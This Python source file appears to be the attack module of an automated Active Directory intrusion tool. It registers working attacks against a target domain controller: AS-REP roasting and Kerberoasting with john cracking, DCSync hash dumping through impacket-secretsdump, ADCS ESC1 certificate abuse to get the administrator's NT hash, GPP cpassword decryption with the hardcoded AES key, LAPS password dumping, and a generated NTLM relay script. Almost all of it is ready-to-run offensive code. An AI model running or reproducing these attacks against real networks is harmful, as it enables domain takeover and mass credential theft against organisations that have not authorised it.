import re
from base64 import b64decode
from pathlib import Path

from loguru import logger

from ..core.engine import ATTACKS, register
from ..core.rules import RuleEngine, rule_signature
from ..core.state import Cred

EMPTY_NT = "31d6cfe0d16ae931b73c59d7e0c089c0"


@register("attack")
class AttackPhase:
    """Runs every applicable rule's attack, in rules.yaml order (= priority)."""

    def __init__(self, ctx):
        self.ctx = ctx

    def run(self):
        total = 0
        for rule in RuleEngine(self.ctx.rules).applicable(self.ctx.state, self.ctx.cfg):
            fn = ATTACKS.get(rule["attack"])
            if not fn:
                logger.warning(f"no implementation for {rule['attack']} ({rule['id']})")
                continue
            logger.info(f"⚔️  {rule['id']} → {rule['attack']}")
            try:
                total += fn(self.ctx, rule) or 0
            except Exception as e:
                logger.exception(f"attack {rule['id']} failed: {e}")
            finally:
                self.ctx.state.executed.add(
                    f"{rule['id']}:{rule_signature(rule, self.ctx.state.facts)}")
        return total


def register_attack(name):
    def deco(fn):
        ATTACKS[name] = fn
        return fn
    return deco


def _validated_cred(state):
    return next((c for c in state.creds if c.validated), state.creds[0] if state.creds else None)


def _imp_pos(ctx, cred):
    """Impacket positional auth: 'dom/u:pass@dc' or 'dom/u@dc' + -hashes."""
    t = ctx.cfg.target
    if cred.secret_type == "password":
        return f"'{t.domain}/{cred.username}:{cred.secret}@{t.dc_ip}'", []
    return f"'{t.domain}/{cred.username}@{t.dc_ip}'", ["-hashes", f":{cred.secret}"]


def _parse_cracked(text, state, source) -> int:
    new = 0
    for line in text.splitlines():
        if ":" not in line:
            continue
        left, pw = line.rsplit(":", 1)
        if not pw:
            continue
        user = left.split("@")[0].split("\\")[-1].split(":")[0].rstrip("$")
        if state.add_cred(Cred(user, pw, "password", source)):
            logger.success(f"💰 cracked: {user} : {pw}")
            new += 1
    return new


@register_attack("asrep_roast")
def asrep_roast(ctx, rule):
    wl = ctx.cfg.wordlists.get("passwords")
    h = ctx.state.facts["asrep_hashes"]
    if wl:
        ctx.ex.run(f"john --wordlist={wl} {h}", name="asrep_john")
    r = ctx.ex.run(f"john --show {h}", name="asrep_show")
    return _parse_cracked(r.stdout, ctx.state, "AS-REP Roast")


@register_attack("kerberoast")
def kerberoast(ctx, rule):
    t = ctx.cfg.target
    cred = _validated_cred(ctx.state)
    wl = ctx.cfg.wordlists.get("passwords")
    hashes = f"{ctx.ex.rawdir}/kerb.hashes"
    pos, hflag = _imp_pos(ctx, cred)
    ctx.ex.run(f"impacket-GetUserSPNs {pos} {' '.join(hflag)} "
               f"-dc-ip {t.dc_ip} -request -outputfile {hashes}", name="kerberoast")
    if wl and Path(hashes).exists():
        ctx.ex.run(f"john --wordlist={wl} {hashes}", name="kerb_john")
    if not Path(hashes).exists():
        return 0
    r = ctx.ex.run(f"john --show {hashes}", name="kerb_show")
    return _parse_cracked(r.stdout, ctx.state, "Kerberoast")


@register_attack("dcsync")
def dcsync(ctx, rule):
    t = ctx.cfg.target
    cred = _validated_cred(ctx.state)
    pos, hflag = _imp_pos(ctx, cred)
    r = ctx.ex.run(f"impacket-secretsdump {pos} {' '.join(hflag)} "
                   f"-outputfile {ctx.ex.rawdir}/dcsync", name="dcsync")
    if not r.ok:
        return 0
    new, ntds = 0, Path(f"{ctx.ex.rawdir}/dcsync.ntds")
    if ntds.exists():
        for line in ntds.read_text(errors="ignore").splitlines():
            m = re.match(r"(.+?):\d+:[0-9a-f]{32}:([0-9a-f]{32}):::", line)
            if m and m.group(2) != EMPTY_NT:
                user = m.group(1).split("\\")[-1]
                if ctx.state.add_cred(Cred(user, m.group(2), "nthash", "DCSync")):
                    logger.success(f"💰 DCSync: {user} : {m.group(2)}")
                    new += 1
    return new


@register_attack("adcs_esc1")
def adcs_esc1(ctx, rule):
    t = ctx.cfg.target
    cred = _validated_cred(ctx.state)
    if cred.secret_type != "password":
        logger.warning("ESC1 needs a plaintext credential for certipy req — skipping")
        return 0
    new = 0
    for tpl in ctx.state.facts.get("esc1_templates", []):
        name, ca = tpl["template"], tpl["ca"]
        pfx = f"{ctx.ex.rawdir}/esc1_{name}"
        ctx.ex.run(f"certipy req -u '{cred.username}@{t.domain}' -p '{cred.secret}' "
                   f"-ca '{ca}' -template '{name}' -upn administrator@{t.domain} "
                   f"-dc-ip {t.dc_ip} -out {pfx}", name=f"esc1_req_{name}")
        pfx_file = next((f"{pfx}{sfx}" for sfx in ("_administrator.pfx", ".pfx")
                         if Path(f"{pfx}{sfx}").exists()), None)
        if not pfx_file:
            continue
        auth = ctx.ex.run(f"certipy auth -pfx {pfx_file} -dc-ip {t.dc_ip}",
                          name=f"esc1_auth_{name}")
        m = re.search(r"([0-9a-f]{32}):([0-9a-f]{32})", auth.stdout)
        if m and m.group(2) != EMPTY_NT:
            if ctx.state.add_cred(Cred("administrator", m.group(2), "nthash", f"ESC1:{name}")):
                logger.success(f"💰 administrator NT hash via ESC1 ({name})")
                new += 1
    return new


@register_attack("gpp_decrypt")
def gpp_decrypt(ctx, rule):
    """Native AES decrypt of cpassword values (no external tool)."""
    from Crypto.Cipher import AES
    KEY = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
    r = ctx.ex.run(f"nxc smb {ctx.cfg.target.dc_ip} -u '' -p '' -M gpp_password",
                   name="gpp_pull")
    new = 0
    for line in r.stdout.splitlines():
        cpw = re.search(r"cpassword['\"]?\s*[:=]\s*['\"]?([A-Za-z0-9+/=]+)", line)
        if not cpw:
            continue
        usr = re.search(r"(?:userName|user|newName)['\"]?\s*[:=]\s*['\"]?([\w .-]+)", line)
        try:
            ct = b64decode(cpw.group(1) + "=" * ((4 - len(cpw.group(1)) % 4) % 4))
            pt = AES.new(KEY, AES.MODE_CBC, iv=b"\x00" * 16) \
                    .decrypt(ct).rstrip(b"\x00").decode(errors="ignore")
            logger.success(f"💰 GPP password: {pt}" + (f" (user: {usr.group(1)})" if usr else ""))
            if usr and usr.group(1):
                if ctx.state.add_cred(Cred(usr.group(1), pt, "password", "GPP")):
                    new += 1
        except Exception:
            pass
    return new


@register_attack("relay_stage")
def relay_stage(ctx, rule):
    """Generates a ready-to-run relay script (needs positioned network + root)."""
    runbook = f"""#!/bin/bash
# forge — NTLM relay runbook (run from a host inside the target network)
sudo responder -I {ctx.cfg.iface} &
sudo ntlmrelayx.py -tf {ctx.state.facts['no_signing_hosts']} -smb2support \\
  -socks -of {ctx.ex.rawdir}/relay_creds
"""
    (Path(ctx.cfg.output_dir) / "relay_runbook.sh").write_text(runbook)
    logger.info("relay runbook staged → output/relay_runbook.sh")
    return 0


@register_attack("laps_dump")
def laps_dump(ctx, rule):
    cred = _validated_cred(ctx.state)
    r = ctx.ex.run(f"nxc smb {ctx.cfg.target.range or ctx.cfg.target.dc_ip} "
                   f"-u '{cred.username}' -p '{cred.secret}' -M laps", name="laps_dump")
    new = 0
    for line in r.stdout.splitlines():
        m = re.search(r"(\S+)\s+\S+\s+(\S+)\s+.*laps", line, re.I)
        if m:
            if ctx.state.add_cred(Cred(f"{m.group(1)}\\administrator", m.group(2),
                                       "password", "LAPS")):
                logger.success(f"💰 LAPS: {m.group(1)}\\administrator")
                new += 1
    return new
